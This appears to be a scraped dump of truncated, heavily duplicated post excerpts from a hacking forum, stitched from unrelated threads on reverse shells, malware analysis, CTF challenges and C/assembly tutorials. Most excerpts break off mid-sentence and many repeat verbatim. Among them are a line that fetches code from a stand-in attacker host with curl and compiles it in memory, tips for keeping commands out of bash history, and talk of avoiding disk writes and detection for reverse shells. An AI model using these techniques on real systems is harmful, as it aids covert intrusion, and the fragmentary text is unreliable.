basic techniques you need to learn in order to fiddle with other processe&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Haven\u2019t thought about that. It is a very good point. There are a couple of things to check before dumping stuff in a tmpfs!. Thanks for the great comments", "Haven\u2019t thought about that. It is a very good point. There are a couple of things to check before dumping stuff in a tmpfs!. Thanks for the great comments", "Haven\u2019t thought about that. It is a very good point. There are a couple of things to check before dumping stuff in a tmpfs!. Thanks for the great comments", "Right, some distros choose to go against what upstream suggests, usually (then they run scripts to purge it when shutting down, or they don\u2019t). Somtimes, the admin may configure it to be on the disk, or have it mounted with noexec by putting an entry in fstab or something of that kind. This should &hellip;", "I don\u2019t blame those two at all. I\u2019m happy one of my articles led to such an interesting discussion. That\u2019s what these articles are for in the first place right? Reading - Understanding - Discussing", "Right, some distros choose to go against what upstream suggests, usually (then they run scripts to purge it when shutting down, or they don\u2019t). Somtimes, the admin may configure it to be on the disk, or have it mounted with noexec by putting an entry in fstab or something of that kind. This should &hellip;", "I don\u2019t blame those two at all. I\u2019m happy one of my articles led to such an interesting discussion. That\u2019s what these articles are for in the first place right? Reading - Understanding - Discussing", "You article was great as it was the starting point for some interesting discussions\u2026 blame @pry0cc and @IoTh1nkN0t for pushing this farther", "You article was great as it was the starting point for some interesting discussions\u2026 blame @pry0cc and @IoTh1nkN0t for pushing this farther", "Since this topic of \u201cstealthy reverse shell\u201d got a lot of attention @0x00pf created a new article to clarify the possibilites what is possible and must be considered to prevent disk writings when attempting a reverse shell. Much kudos to him. Show his article some love, but not more than mine. Pls  &hellip;", "You article was great as it was the starting point for some interesting discussions\u2026 blame @pry0cc and @IoTh1nkN0t for pushing this farther", "I think you are right, and it usually does not have the noexec flag set. However, sometime it is mounted on the disk so it is better to first check. /dev/sdm and /run/shm are always memory based.", "@0x00pf yes mention and \u201cpraise\u201d me more for my awesome topic. go on. don\u2019t stop yet. nah mate awesome \u201creply\u201d to the question which evolved on my thread the last days. I\u2019ll cross link this article there too, so finding it will be easy. Back to topic now. This brings the topic of spawning a rever&hellip;", "I think you are right, and it usually does not have the noexec flag set. However, sometime it is mounted on the disk so it is better to first check. /dev/sdm and /run/shm are always memory based.", "@0x00pf Can\u2019t we use /tmp for this purpose, the common mount options enabled on most Linux systems today by default (since they run systemd, which mounts /tmp as tmpfs afaict, or unless configured otherwise) are rw, nosuid and nodev. /tmp is tmpfs so writing here won\u2019t make changes to the disk. What&hellip;", "You can also use set +o history to turn it off and set -o history to turn it back on.", "Since this topic of \u201cstealthy reverse shell\u201d got a lot of attention @0x00pf created a new article to clarify the possibilites what is possible and must be considered to prevent disk writings when attempting a reverse shell. Much kudos to him. Show his article some love, but not more than mine. Pls  &hellip;", "@0x00pf yes mention and \u201cpraise\u201d me more for my awesome topic. go on. don\u2019t stop yet. nah mate awesome \u201creply\u201d to the question which evolved on my thread the last days. I\u2019ll cross link this article there too, so finding it will be easy. Back to topic now. This brings the topic of spawning a rever&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "@0x00pf Can\u2019t we use /tmp for this purpose, the common mount options enabled on most Linux systems today by default (since they run systemd, which mounts /tmp as tmpfs afaict, or unless configured otherwise) are rw, nosuid and nodev. /tmp is tmpfs so writing here won\u2019t make changes to the disk. What&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "That\u2019s a nice trick. Thanks for sharing @SmartOne", "Great article! However, be sure to leave a space before the commands in order to make sure that they aren\u2019t saved to the (bash) history", "Continuing the discussion from Spawning reverse shells: I was about to reply on (Spawning reverse shells), but my reply has got so long that I decided to made it into a post. Please first read the original thread from @RickSanchez and the comments there, before you continue. The discussion here, i&hellip;", "ahaha same for me ! But it will be funny xD", "ahaha same for me ! But it will be funny xD", "It was exactly the same for me\u2026 that was my first real C program ever!!!. It would be awesome if you share it\u2026 mine I think is definitely lost and I\u2019m scary to look again to that code", "Very nice guide! I\u2019m coming from python and this is (for me) very clearly explained and easy to read. Please continue!", "It was exactly the same for me\u2026 that was my first real C program ever!!!. It would be awesome if you share it\u2026 mine I think is definitely lost and I\u2019m scary to look again to that code", "Sorry for digging up such old topic but I would like to say that this project is awesome. I had the chance to develop it at the uni a long time ago and it\u2019s a good way to challenge your skill in C and ASM. I will try to put my hand on it and share my work with you guys. Best, Nitrax", "thanks guys, really appreciate all the thoughtful comments. I will take the advice and learn C first instead of C++!", "I was messing around with @IoTh1nkN0t on IRC, exploring the possibilities of running binary in the shell. You can already compile C code to stdout. curl - s https://attacker/malicious-code.c | gcc -o /dev/stdout -x c -We tried things like ./-, but it seems pretty difficult to execute code, withou&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Learning assembly takes a while, and it is a bit hard to jump straight into a modern processor and start coding\u2026 So, if you do not have any experience with the bare metal, it is good to start with a pretty simple assembly. And the simplest assembly I can recall is called RedCode Despite of being &hellip;", "I was messing around with @IoTh1nkN0t on IRC, exploring the possibilities of running binary in the shell. You can already compile C code to stdout. curl - s https://attacker/malicious-code.c | gcc -o /dev/stdout -x c -We tried things like ./-, but it seems pretty difficult to execute code, withou&hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "I\u2019d like to reiterate that learning plain old C first is probably going to make your life a lot easier\u2026 I use C and C++ (more the latter) and I can tell you that they are not the same. C++ adds so much more that reversing it is likely less beginner-friendly\u2026", "Let\u2019s put away the serious stuff for a while and let\u2019s have some fun. What about some hacking pranks!. Let\u2019s start with something simple, the so called nervous mouse. Note: The code is a modification of some example from internet. I cannot recall where I got it, but it is, let\u2019s say, the default ex&hellip;", "I\u2019d like to reiterate that learning plain old C first is probably going to make your life a lot easier\u2026 I use C and C++ (more the latter) and I can tell you that they are not the same. C++ adds so much more that reversing it is likely less beginner-friendly\u2026", "I\u2019d like to reiterate that learning plain old C first is probably going to make your life a lot easier\u2026 I use C and C++ (more the latter) and I can tell you that they are not the same. C++ adds so much more that reversing it is likely less beginner-friendly\u2026", "Hi @FormosaTBM and welcomed! Right. You may also consider MIPS as that is the most extended platforms for network devices. Once you manage one of the platforms, moving to a new one is easy because, the basics (as @_py said), are the same. /self promo mode=&quot;on&quot; Take a look to the programming for &hellip;", "Hi @FormosaTBM and welcomed! Right. You may also consider MIPS as that is the most extended platforms for network devices. Once you manage one of the platforms, moving to a new one is easy because, the basics (as @_py said), are the same. /self promo mode=&quot;on&quot; Take a look to the programming for &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Actually you can easily get it: cat /proc/PID/exe &gt; binary The problem is that in order to get the remote shell you need to first run some code. If the access to the target machine was through a remote exploit then what you propose is the right way to go. If you have got just, telnet access, for i&hellip;", "Actually you can easily get it: cat /proc/PID/exe &gt; binary The problem is that in order to get the remote shell you need to first run some code. If the access to the target machine was through a remote exploit then what you propose is the right way to go. If you have got just, telnet access, for i&hellip;", "Actually you can easily get it: cat /proc/PID/exe &gt; binary The problem is that in order to get the remote shell you need to first run some code. If the access to the target machine was through a remote exploit then what you propose is the right way to go. If you have got just, telnet access, for i&hellip;", "Chuck Norris is a dead meme, normie. on-topic: good article as always. bookmarked it for later reference.", "Wouldn\u2019t the data still exist such that it could potentially be extracted using some forensics magics? Maybe it\u2019d be better to allocate it some memory in a suspended process, then copied into the allocated memory and executed? This way, it never actually touches the disk.", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Wouldn\u2019t the data still exist such that it could potentially be extracted using some forensics magics? Maybe it\u2019d be better to allocate it some memory in a suspended process, then copied into the allocated memory and executed? This way, it never actually touches the disk.", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "@0x00pf thanks and awesome continuation of the list! Love that approach! I\u2019m curious if we will see more fun approaches to this.", "@0x00pf thanks and awesome continuation of the list! Love that approach! I\u2019m curious if we will see more fun approaches to this.", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "Nice post @ricksanchez ! This is my proposal for section 6 (What\u2019s next) #6. Chuck Norris\u2019 way Chuck Norris is not a hacker but he pwns any computer just walking close to it Chuck Norris writes his own reverse shells directly in machine code and types it in hex by heartChuck Norris writes IPs &hellip;", "PrefaceThis will be a short article which will demonstrates how to spawn an interactive reverse shell using built-in tools on any linux distribution. Also it shows what mindset and what kind of creativity might be needed when being a hacker or pentester. But why?There are many distributions of l&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Hi guys, a quick update to inform you that whichCDN seems to have been added to blackarch. I must admit that I\u2019m quite proud of it. Have a good day. Nitrax", "I\u2019ve been lurking on the forum quite a bit now and after some thought, I decided to share this cool hack with you. As the name suggest, we are gonna try running Linux on Android without Root. No this is not a Debian No Root app that you can see in the playstore, but instead a Limbo PC Emulator. Lim&hellip;", "Hi @Red_Joker, Have you played with Kali using this setup?.. I believe most of the interesting tools won\u2019t work unless your device is rooted. For non rooted devices Proot is maybe less demanding and I believe you can get similar functionalities. You can also run tools from outside the chroot just &hellip;", "There are at least a million+ ARM processors around us. That being said, the following link is an intro to ARM assembly from an exploit dev perspective. The author starts off by explaining the basics and in the next \u201cpack\u201d of series, she\u2019ll introduce ARM pwning. I figured it\u2019d be a neat reference f&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Sure\u2026 lots of ideas taken. I knew about movuscator, but there are other alternatives", "Sure\u2026 lots of ideas taken. I knew about movuscator, but there are other alternatives", "Awesome related REcon and DEFCON talks: Don\u2019t give ideas to @0x00pf please.", "For those who want to fuck a reverse engineer\u2019s day up, prepare yourself\u2026 @IoTh1nkN0t @_py", "Awesome related REcon and DEFCON talks: Don\u2019t give ideas to @0x00pf please.", "Thanks for your reply. It works now I uninstall and install again kernel headers and done", "Thanks for your reply. It works now I uninstall and install again kernel headers and done", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Hi @Pwned08000202 A quick copy and paste of your error on Google shows that you may have be using pwd (lowercase) instead of PWD (uppercase) in your Makefile. Other than that I have no idea\u2026  Usually you only need the kernel source (kernel headers) to compile your module. Hope this help", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome  Linux kernel modul&hellip;", "Hi @Pwned08000202 A quick copy and paste of your error on Google shows that you may have be using pwd (lowercase) instead of PWD (uppercase) in your Makefile. Other than that I have no idea\u2026  Usually you only need the kernel source (kernel headers) to compile your module. Hope this help", "###Solving a Heap exploitation challenge  In the name of Allah, the most beneficent, the most merciful. Thanks to @_py and @n0tnu11  who encouraged me, to write about such thing\u2026 I want to say sorry, cause i don\u2019t write alot more articles, you know guys, studies \u2026 It wasn\u2019t easy for me to&hellip;", "Aye p33ps! Seeing as WannaCry took the world by storm recently, I thought that it\u2019s probably a good time to introduce the world of malware analysis to this forum. In this post, I will write about how you guys can join in on the mayhem and play with some fire (and hopefully not get burnt in the proce&hellip;", "Aye p33ps! Seeing as WannaCry took the world by storm recently, I thought that it\u2019s probably a good time to introduce the world of malware analysis to this forum. In this post, I will write about how you guys can join in on the mayhem and play with some fire (and hopefully not get burnt in the proce&hellip;", "This was cool. We all know that real hacking requires quirky sound feedback at all times.", "If you\u2019re like me, you like to see the pins in a tumbler as the key slides into the barrel of the lock. No, that\u2019s not a sexual innuendo. It\u2019s just plain cool to see the inner workings of a complex machine. There\u2019s just such a thing for crypto enthusiasts in the form of a virtual Lorenz machine. He&hellip;", "Congrats!  @_py Sure\u2026 please do. I\u2019d love to see how did you solve it!.. and I agree, probably a separated write-up will be more convenient", "Congrats!  @_py Sure\u2026 please do. I\u2019d love to see how did you solve it!.. and I agree, probably a separated write-up will be more convenient", "Thanks for the write-up, really great article. Had a fun time reading through it.", "Done. Write-up on its way soon (need to nap first). Thank you @0x00pf for the challenge! I hope you don\u2019t mind me making a separate write-up of the solution. Password: omelette", "Done. Write-up on its way soon (need to nap first). Thank you @0x00pf for the challenge! I hope you don\u2019t mind me making a separate write-up of the solution. Password: omelette", "Looks like the hint you found was not clear enough. Let\u2019s try with another one:  This is a Easter challenge because  an Easter Egg is hidden in it. To find it, you may need to grab a JAR of coffee. The Indonesian one is pretty good", "Looks like the hint you found was not clear enough. Let\u2019s try with another one:  This is a Easter challenge because  an Easter Egg is hidden in it. To find it, you may need to grab a JAR of coffee. The Indonesian one is pretty good", "I\u2019m either close or completely off or I found it (though it shouldn\u2019t be it yet). Here is a tricky message I got: \u2018\u2019\u2018 Well done. But\u2026 this is not the bean you have to grind! \u2019\u2019\u2019", "NB: Categorized as Networking Tutorial since this is a concept that uses networking. However, it might fall into malware or exploit dev as well. Admins, please change at your discretion. Given the recent saga of WannaCry and the amazingly hilarious way it was foiled (for now), I think it\u2019s apropos &hellip;", "Thats why i in general like taking those challenges, if i have the time to invest  more than am hour in one session into it\u2026 Its difficult and frustrating but every small advancement makes you feel like you\u2019re boss. If RE were a piece of cake everyone could it. Edit: adding on this I\u2019ll definitiv&hellip;", "Thats why i in general like taking those challenges, if i have the time to invest  more than am hour in one session into it\u2026 Its difficult and frustrating but every small advancement makes you feel like you\u2019re boss. If RE were a piece of cake everyone could it. Edit: adding on this I\u2019ll definitiv&hellip;", "Hey, I only just noticed this thread a couple of hours ago. Jokes aside, @pry0cc, RE goes much deeper than just what is given to you in the clear. Understanding the macro (execution flow of the entire binary) and micro (code constructs which have specific patterns and behaviours) is a necessary sk&hellip;", "Hey, I only just noticed this thread a couple of hours ago. Jokes aside, @pry0cc, RE goes much deeper than just what is given to you in the clear. Understanding the macro (execution flow of the entire binary) and micro (code constructs which have specific patterns and behaviours) is a necessary sk&hellip;", "I have added a non stripped version of the challenge that should be easier\u2026 You won\u2019t find fread or similar calls but you should be able to figure out the equivalences", "I was planning to release this during Easter but, unfortunately, I didn\u2019t manage to finish it on time. So this Easter challenge has just become a late Easter Challenge. #Difficulty I have no idea as I haven\u2019t tried to solve it myself\u2026 it may bevery easy or very tricky so here is a poll for the com&hellip;", "Whoever solves it, please don\u2019t forget to blur your solution.", "If you are lazy. Run this one-liner  curl https://0x0.st/g-r.txt | base64-d | gunzip &gt; eo &amp;&amp; chmod 777 eoPersonally, I didn\u2019t know where to start, so I pulled up my favourite RE article. And I was still stuck. After finding main I struggled to locate any references to fread or any sorts of calls.&hellip;", "I was planning to release this during Easter but, unfortunately, I didn\u2019t manage to finish it on time. So this Easter challenge has just become a late Easter Challenge. #Difficulty I have no idea as I haven\u2019t tried to solve it myself\u2026 it may bevery easy or very tricky so here is a poll for the com&hellip;", "I was planning to release this during Easter but, unfortunately, I didn\u2019t manage to finish it on time. So this Easter challenge has just become a late Easter Challenge. #Difficulty I have no idea as I haven\u2019t tried to solve it myself\u2026 it may bevery easy or very tricky so here is a poll for the com&hellip;", "Nice exercise to refresh my Perl, that I have to admit is a bit rusty\u2026 This is my decoder  Use:   $ cat msg.txt |  ./decoder.pl#!/usr/bin/perl$_= &lt;&gt;;s/\\.(\\d+)\\.(\\d+)\\.(\\d+)/$h{($i=$1+$2+$3)}++; push @p, $i; $i.&quot; &quot;/ge;$h{$_} &gt; $h{$m} and $m = $_ for keys %h;$_ = chr($_ - $m + 32) and prin&hellip;", "This is also a nice solution. My python script is way longer because I had fun coding a lot of short functions lol.", "This is also a nice solution. My python script is way longer because I had fun coding a lot of short functions lol.", "Nice exercise to refresh my Perl, that I have to admit is a bit rusty\u2026 This is my decoder  Use:   $ cat msg.txt |  ./decoder.pl#!/usr/bin/perl$_= &lt;&gt;;s/\\.(\\d+)\\.(\\d+)\\.(\\d+)/$h{($i=$1+$2+$3)}++; push @p, $i; $i.&quot; &quot;/ge;$h{$_} &gt; $h{$m} and $m = $_ for keys %h;$_ = chr($_ - $m + 32) and prin&hellip;", "Nice exercise to refresh my Perl, that I have to admit is a bit rusty\u2026 This is my decoder  Use:   $ cat msg.txt |  ./decoder.pl#!/usr/bin/perl$_= &lt;&gt;;s/\\.(\\d+)\\.(\\d+)\\.(\\d+)/$h{($i=$1+$2+$3)}++; push @p, $i; $i.&quot; &quot;/ge;$h{$_} &gt; $h{$m} and $m = $_ for keys %h;$_ = chr($_ - $m + 32) and prin&hellip;", "PrefaceI stated my reasoning behind this article series in the first article which can be found here. To avoid redundancy please check out the preface over there and let\u2019s get right into action! note: If I write non sense in this and the next following articles please correct me for the sake of m&hellip;", "Thank you so much for the encouraging comment @shahril! This is because the instruction jmp *0x804a00c will take the 4 bytes value at the 0x804a00c address. You can imagine that this instruction is the same as jmp dword ptr [0x804a00c]. You are right about that. That\u2019s the Intel version of the i&hellip;", "Thanks for the paper @_py! Reading your newest article Linux Internals - The Art Of Symbol Resolution plus reading this again really makes sense, as I\u2019m able to understand it in just one shot! I love how you introduced the concept of GOT through array indices [0][1][2], which really makes sense for&hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "great article. Especially how you made it readable for even people with almost 0 knowledge", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Nice article  . I was briefly looking at Hajime in the last days so it\u2019s nice to get a \u2018summary\u2019 and some explanation for it here. Also I can agree with pry it\u2019s easy to follow through until the end", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "I have really enjoyed this read. It\u2019s a nice and relaxed reading, and helps you to really understand the kind of things malware developers have to think about.", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "I really enjoyed reading this analysis on some seriously hyped malware. One little thing: It\u2019s the -a flag.", "Thanks for spotting that\u2026 You are completely right. I will fix it!", "Thanks for spotting that\u2026 You are completely right. I will fix it!", "I really enjoyed reading this analysis on some seriously hyped malware. One little thing: It\u2019s the -a flag.", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "Recently I have been reading a bit about different IoT/embedded malwares and I have found the reading very interesting and instructive so I have decided to share with you what I have found. Author Assigned Level: NewbieCommunity Assigned Level:NewbieWannabeHackerWizardGuru0voters &hellip;", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "I wouldn\u2019t exactly call this porting, but decent article nonetheless.", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "@oaktree @pry0cc @IoTh1nkN0t @0x00pf he\u2019s got a point.", "@oaktree @pry0cc @IoTh1nkN0t @0x00pf he\u2019s got a point.", "@VVid0w @ricksanchez: Though I completely understand where you are coming from and I personally strive to always make my write-ups beginner friendly and technical at the same time, you have to see it from a different perspective as well. What you are essentially saying is that @exploit should inclu&hellip;", "##Guide for Data SanitizationHello everyone, hope you\u2019ve been doing great! @Evalion recently said that we should post articles about something that we are learning, both to help us study and maybe to introduce other people to new subjects. That\u2019s what this article is, so forgive (and please correct&hellip;", "Solving a ROP on 64-bit challenge In the name of Allah, the most beneficent, the most merciful. ###Before i begin this article, i want to thank @_py for showing me this beautiful community \u2026 This article is for learning purposes\u2026 Hello everybody, this my first article ever, i\u2019m not really go&hellip;", "In a connected world, remotely accessing computers is happening all the time. You use services like ssh or telnet for that purpose but, sometimes, they are not available or it is not possible to even deploy those services in the target device. In those cases you can easily write your own remote shel&hellip;", "Instead of using the on-line services (that are perfectly fine), you can convert those numbers like this: $ echo &quot;obase=16;BIG_DECIMAL_NUMBER&quot; | bc$ echo &quot;HEX_SEQUENCE&quot; | xxd -r -pOr in 1 shot echo &quot;obase=16;BIG_DECIMAL_NUMBER&quot; | bc | xxd -r -pGreat post by the way!", "awesome man! so: echo &quot;obase=16;`python solve.py`&quot; | bc | xxd -r -p", "awesome man! so: echo &quot;obase=16;`python solve.py`&quot; | bc | xxd -r -p", "Instead of using the on-line services (that are perfectly fine), you can convert those numbers like this: $ echo &quot;obase=16;BIG_DECIMAL_NUMBER&quot; | bc$ echo &quot;HEX_SEQUENCE&quot; | xxd -r -pOr in 1 shot echo &quot;obase=16;BIG_DECIMAL_NUMBER&quot; | bc | xxd -r -pGreat post by the way!", "So as you might know, pysec, dtm, kowalski and me did the picoCTF some time back. One of the challenges we did was an RSA one. The challenge was as follows e = 65537n = 6423132408480640149750439343086582424473124851523426736107568595350901037046104720049133495026481570911044633035111312786651761&hellip;", "Zup folks, for the picoCTF we (dtm, pysec, kowalski and me), had to solve several crypto challenges. RSA being the most common subject. So here I thought it\u2019s time to share what I know about RSA, because it\u2019s one of the most common algorithms seen in public key crypto. First let\u2019s start with a li&hellip;", "Hello folks! I hope you\u2019re all doing great. After a disgusting amount of trial and error, I present to you my solution for the console pwnable. Unfortunately, I did not solve the task on time but it was fun nevertheless. I decided to use this challenge as a way to introduce to you one of the ways yo&hellip;", "Sure The easiest way is to use radare 2 Sorry about the image do not know how to make it bigger. it says: $ r2 ./k [xxxx] aa [xxxx] pdf @main  [image]You can see in the assembly how the program opens a file named \u2018keyfile.dat\u2019 and then reads its content using fread into memory. Then, the re&hellip;", "Pretty cool write up!.. Looking forward to more!!!", "@pry0cc I\u2019m not hating. I\u2019m peaceful and loving mayn. Btw, you learn by reading. You master by doing. You can\u2019t just stick your head in the sand.  Once you know enough theory, you\u2019ll have the resources to google for the right keywords/solutions and find your way through tasks.", "But how much of Hacking: The Art of Exploitation have you read?", "0x00sec turns 0x01!We made it, guys! 0x00sec is a year old. We went from a simple Jekyll blog with only three articles to a respectably-sized, full-on forum with over 500 users. Each day, one or more people took a chance and signed up. [image] Countless Introductions showcase our diversity of int&hellip;", "0x00sec turns 0x01!We made it, guys! 0x00sec is a year old. We went from a simple Jekyll blog with only three articles to a respectably-sized, full-on forum with over 500 users. Each day, one or more people took a chance and signed up. [image] Countless Introductions showcase our diversity of int&hellip;", "Nice introduction @pry0cc. My two cents The ~ is almost equivalent to $HOME: cd ~/Documentscd $HOME/Documents But what you can also do is to specify a username cd ~pico/DocumentsWill change directory to /home/pico/Documents or whatever other location the home directory is set for user pico. &hellip;", "Pretty cool write up!.. Looking forward to more!!!", "Pretty cool write up!.. Looking forward to more!!!", "Hello folks! I hope you\u2019re doing great. This is my first ever CTF write-up yay! During the last couple of weeks, @IoTh1nkN0t, @dtm, @kowalski and myself, took part in picoCTF. It\u2019s an \u201centry-level\u201d CTF, which practically means, it\u2019s made for CTF rookies! Well, you needed a little bit of experience &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Hi fellas, Today, I wanted to spend some time explaining you why Wordpress is, and will still be, the best CMS of all time ! Indeed, since its release on May 27, 2003, no flaw has been found and its founders are kept hard work to maintain and enhance this fabulous solution that help thousand users&hellip;", "Getting Stealthy with StelfHello 0x00\u2019ers! In this tutorial, I am going to be giving away some content that has been sought after for a long time. Everybody knows that most prebuilt tools such as Metasploit don\u2019t work, payloads generated by them, or encoders used with them. They get picked up by a&hellip;", "Here\u2019s the basic idea (keep in mind this will work on 32-bit binaries):                            Stack                  +----------------------+                  |       &quot;/bin/sh&quot;      |                  +----------------------+                  |   ret_after_system   |                  +---&hellip;", "@operatorequals congrats for the great blog. I found them some weeks ago and really enjoyed reading them. Good you passed by our community!", "In this last part of this series, we are going to see how to build a pretty stealth remote shell. This remote shell usually also have better chances to avoid detection systems like firewalls and IDS. As described above, it sounds like the definitely remote access tool. Doesn\u2019t it?. Well, actually s&hellip;", "Hello there! I am the author of those posts. Thanks a lot for mentioning them! unDLP looks quite promising! Added to the things I follow.", "Are you trying to master the ELF format and you need some stuff to try your new skills?.. well, this is a simple challenge for you to try. The ChallengeA colleague that works as Network Engineer for an important company has captured a piece of malware that somebody was trying to use against the co&hellip;", "Nice stuff. It gives me a good feeling while reading", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or 